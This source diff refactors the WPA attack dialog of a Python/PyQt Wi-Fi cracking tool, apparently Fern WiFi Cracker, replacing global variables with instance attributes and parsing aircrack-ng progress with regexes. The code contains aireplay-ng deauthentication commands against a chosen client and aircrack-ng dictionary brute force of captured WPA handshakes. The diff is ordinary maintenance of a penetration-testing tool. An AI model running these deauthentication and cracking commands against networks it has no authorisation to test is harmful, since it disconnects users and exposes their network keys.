@@ -18,7 +18,7 @@ class wpa_attack_dialog(QtGui.QDialog,Ui_attack_panel):
         self.setupUi(self)
         self.retranslateUi(self)
         self.setWindowModality(QtCore.Qt.ApplicationModal)
-        global access_point
+        self.access_point = str()
         self.client_list = []
         self.started = False
 
@@ -79,6 +79,14 @@ class wpa_attack_dialog(QtGui.QDialog,Ui_attack_panel):
         self.control = True
         self.cracked_keys = 0
         self.thread_control = True
+
+        self.select_client = str()
+        self.progress_bar_max = int()
+        self.wpa_key_commit = str()
+        self.current_word= str()
+        self.word_number = int()
+        self.current_speed = str()
+        self.word_number = int()
 
         self.access_points = set()
         self.mac_address = str()
@@ -286,16 +294,15 @@ class wpa_attack_dialog(QtGui.QDialog,Ui_attack_panel):
 
     def deauthenticating_display(self):
         self.injecting_label.setEnabled(True)
-        self.injecting_label.setText('<font color=yellow>Deauthenticating %s</font>'%(select_client))
+        self.injecting_label.setText('<font color=yellow>Deauthenticating %s</font>'%(self.select_client))
 
     def handshake_captured(self):
-        global access_point
         self.gathering_label.setEnabled(True)
         self.gathering_label.setText('<font color=yellow>Handshake Captured</font>')
 
         if self.settings.setting_exists('capture_directory'):
             shutil.copyfile('/tmp/fern-log/WPA-DUMP/wpa_dump-01.cap',\
-                self.settings.read_last_settings('capture_directory') + '/%s_Capture_File(WPA).cap'%(access_point))
+                self.settings.read_last_settings('capture_directory') + '/%s_Capture_File(WPA).cap'%(variables.victim_access_point))
 
 
     def bruteforce_display(self):
@@ -303,7 +310,6 @@ class wpa_attack_dialog(QtGui.QDialog,Ui_attack_panel):
         self.cracking_label_2.setText('<font color=yellow>Bruteforcing WPA Encryption</font>')
 
     def wpa_key_found(self):
-        global wpa_key_commit
         icon = QtGui.QIcon()
         icon.addPixmap(QtGui.QPixmap("%s/resources/wifi_4.png"%(os.getcwd())))
         self.attack_button.setIcon(icon)
@@ -319,24 +325,24 @@ class wpa_attack_dialog(QtGui.QDialog,Ui_attack_panel):
         self.key_label.setVisible(True)
         self.key_label.setText('<font color=red>WPA KEY: %s</font>'%(wpa_key_read))
 
-        if wpa_key_commit == 0:
+        if self.wpa_key_commit == 0:
             set_key_entries(variables.victim_access_point,variables.victim_mac,'WPA',wpa_key_read,variables.victim_channel)            #Add WPA Key to Database Here
             self.emit(QtCore.SIGNAL('update database label'))
-            wpa_key_commit += 1
+            self.wpa_key_commit += 1
             self.isfinished = True
 
 
 
     def update_word_label(self):
         self.ivs_progress_label.setEnabled(True)
-        self.ivs_progress_label.setText('<font color=yellow>%s</font>'%(current_word))
+        self.ivs_progress_label.setText('<font color=yellow>%s</font>'%(self.current_word))
 
     def update_progress_bar(self):
-        self.progressBar.setValue(word_number)
+        self.progressBar.setValue(self.word_number)
 
     def update_speed_label(self):
         self.finished_label.setEnabled(True)
-        self.finished_label.setText('<font color=yellow>Speed: \t %s</font>'%(current_speed))
+        self.finished_label.setText('<font color=yellow>Speed: \t %s k/s</font>'%(self.current_speed))
 
     def display_label(self):
         self.finished_label.setEnabled(True)
@@ -357,7 +363,7 @@ class wpa_attack_dialog(QtGui.QDialog,Ui_attack_panel):
                         self.wpa_launch_attack()
 
     def set_maximum(self):
-        self.progressBar.setValue(progress_bar_max)
+        self.progressBar.setValue(self.progress_bar_max)
 
 
 
@@ -405,76 +411,35 @@ class wpa_attack_dialog(QtGui.QDialog,Ui_attack_panel):
 
 
     def launch_brutefore(self):
-        global control
-        crack_process = subprocess.Popen("cd /tmp/fern-log/WPA-DUMP/ \n aircrack-ng -a 2 -w '%s' *.cap -l wpa_key.txt | grep 'Current passphrase'"%(self.wordlist),
+        current_word_regex = re.compile("Current passphrase: ([\w\s!@#$%^&*()-=_+]+)",re.IGNORECASE)
+        keys_speed_regex = re.compile("(\d+.?\d+) k/s",re.IGNORECASE)
+        keys_tested_regex = re.compile("(\d+) keys tested",re.IGNORECASE)
+
+        crack_process = subprocess.Popen("cd /tmp/fern-log/WPA-DUMP/ \naircrack-ng -a 2 -w '%s' *.cap -l wpa_key.txt" % (self.wordlist),
                              shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
 
         stdout = crack_process.stdout
 
         while 'wpa_key.txt' not in os.listdir('/tmp/fern-log/WPA-DUMP/'):
-            progress_file = open('/tmp/fern-log/WPA-DUMP/progress.txt','a+')
-            file_read = stdout.readline()
-            progress_file.write(str(file_read))
-            progress_file.close()
+            stdout_read = stdout.readline()
+            self.current_word = str()
+
+            current_word = current_word_regex.findall(stdout_read)
+            if(current_word):
+                self.current_word = current_word[0]
+                self.emit(QtCore.SIGNAL("update word"))
+
+            word_number = keys_tested_regex.findall(stdout_read)
+            if(word_number):
+                self.word_number = int(word_number[0])
+                self.emit(QtCore.SIGNAL("update progress bar"))
+
+            current_speed = keys_speed_regex.findall(stdout_read)
+            if(current_speed):
+                self.current_speed = current_speed[0]
+                self.emit(QtCore.SIGNAL("update speed"))
 
         self.emit(QtCore.SIGNAL("wpa key found"))
-
-
-    def wordlist_check(self):
-        control_word = 0
-        global current_word
-        while control_word != 1:
-            controller = current_word
-            time.sleep(30)
-            if controller == current_word:
-                control_word = 1
-                self.emit(QtCore.SIGNAL("set maximum"))
-                self.emit(QtCore.SIGNAL("wpa key not found"))
-            else:
-                pass
-
-
-
-
-    def progress_update(self):
-        global current_word
-        global word_number
-        global current_speed
-        global word_number
-        global control
-        while 'wpa_key.txt' not in os.listdir('/tmp/fern-log/WPA-DUMP/'):
-            time.sleep(5)
-            try:
-                current_word = ''
-                progress_process = reader('/tmp/fern-log/WPA-DUMP/progress.txt')
-                progress_process1 = progress_process.splitlines()
-                progress_process2 = progress_process1[-1]
-                progress_process3 = progress_process2.replace('Current passphrase:','\n')
-                progress_process3 = progress_process3.replace('keys tested','\n')
-                progress_process4 = progress_process3.splitlines()
-                current_word = progress_process4[-1].strip(' ')
-                self.emit(QtCore.SIGNAL("update word"))
-                word_number_process = progress_process4[0]
-                word_number_process1 = word_number_process.replace(']','\n')
-                word_number_process2 = word_number_process1.splitlines()
-                word_number = int(word_number_process2[-1])
-                self.emit(QtCore.SIGNAL("update progress bar"))
-                current_speed_process = progress_process4[1]
-                current_speed_process1 = current_speed_process.replace('k/s)','k/s)\n')
-                current_speed_process2 = current_speed_process1.splitlines()
-                current_speed = current_speed_process2[0].strip(' ')
-                self.emit(QtCore.SIGNAL("update speed"))
-                if word_number >= progress_bar_max:
-                    self.emit(QtCore.SIGNAL("wpa key not found"))
-                    control = 1
-                    break
-                else:
-                    pass
-                commands.getstatusoutput('rm -r /tmp/fern-log/WPA-DUMP/progress.txt')
-            except (IndexError,ValueError,IOError),e:
-                pass
-
-        self.emit(QtCore.SIGNAL("Stop progress display"))
 
 
 
@@ -484,7 +449,7 @@ class wpa_attack_dialog(QtGui.QDialog,Ui_attack_panel):
 
     def deauthenticate_client(self):
         monitor_interface = variables.monitor_interface
-        variables.exec_command('%s aireplay-ng -a %s -c %s -0 5 %s'%(variables.xterm_setting,variables.victim_mac,select_client,monitor_interface))
+        variables.exec_command('%s aireplay-ng -a %s -c %s -0 5 %s'%(variables.xterm_setting,variables.victim_mac,self.select_client,monitor_interface))
 
     def capture_check(self):
         variables.exec_command('cd /tmp/fern-log/WPA-DUMP/ \n aircrack-ng *.cap | tee capture_status.log')
@@ -503,10 +468,19 @@ class wpa_attack_dialog(QtGui.QDialog,Ui_attack_panel):
         self.emit(QtCore.SIGNAL("bruteforcing"))
 
         thread.start_new_thread(self.launch_brutefore,())
-
-        thread.start_new_thread(self.progress_update,())
-
         thread.start_new_thread(self.wordlist_check,())
+
+
+
+    def wordlist_check(self):
+        control_word = 0
+        while control_word != 1:
+            controller = self.current_word
+            time.sleep(30)
+            if controller == self.current_word:
+                control_word = 1
+                self.emit(QtCore.SIGNAL("set maximum"))
+                self.emit(QtCore.SIGNAL("wpa key not found"))
 
 
     def display_current_wordlist(self):
@@ -573,11 +547,7 @@ class wpa_attack_dialog(QtGui.QDialog,Ui_attack_panel):
 
 
     def wpa_launch_attack(self):
-        global wordlist
-        global select_client
-        global progress_bar_max
-        global wpa_key_commit
-        wpa_key_commit = 0
+        self.wpa_key_commit = 0
 
         self.wpa_disable_items()
 
@@ -605,14 +575,14 @@ class wpa_attack_dialog(QtGui.QDialog,Ui_attack_panel):
             self.thread_control = False
             return
 
-        select_client = self.attack_type_combo.currentText()
+        self.select_client = self.attack_type_combo.currentText()
 
-        if(select_client == str()):
+        if(self.select_client == str()):
             QtGui.QMessageBox.warning(self,"WPA Attack Requirement","At least one client MAC-Address asscociated with the Access Point is required to successfully attack the WPA Encryption, If you know a client MAC Address you can add it manually or wait for the probing process to detect client addresses")
             self.attack_type_combo.setFocus()
             return
 
-        if not Check_MAC(select_client):
+        if not Check_MAC(self.select_client):
             QtGui.QMessageBox.warning(self,'Invalid Client MAC Address',variables.invalid_mac_address_error.strip('/n'))
             return
 
@@ -621,7 +591,7 @@ class wpa_attack_dialog(QtGui.QDialog,Ui_attack_panel):
         commands.getstatusoutput('killall airmon-ng')
         commands.getstatusoutput('rm -r /tmp/fern-log/WPA-DUMP/*')
 
-        if select_client == str():
+        if self.select_client == str():
             self.associate_label.setEnabled(True)
             self.associate_label.setText('<font color=red>Client mac-address is needed</font>')
         else:
@@ -639,8 +609,8 @@ class wpa_attack_dialog(QtGui.QDialog,Ui_attack_panel):
                     self.injection_work_label_2.setEnabled(True)
                     self.injection_work_label_2.setText('<font color=red><b>Select Wordlist</b></font>')
 
-                progress_bar_max = line_count(get_temp_name)
-                self.progressBar.setMaximum(progress_bar_max)
+                self.progress_bar_max = line_count(get_temp_name)
+                self.progressBar.setMaximum(self.progress_bar_max)
                 commands.getstatusoutput('killall airodump-ng')
                 commands.getstatusoutput('killall aireplay-ng')
                 self.associate_label.setEnabled(True)
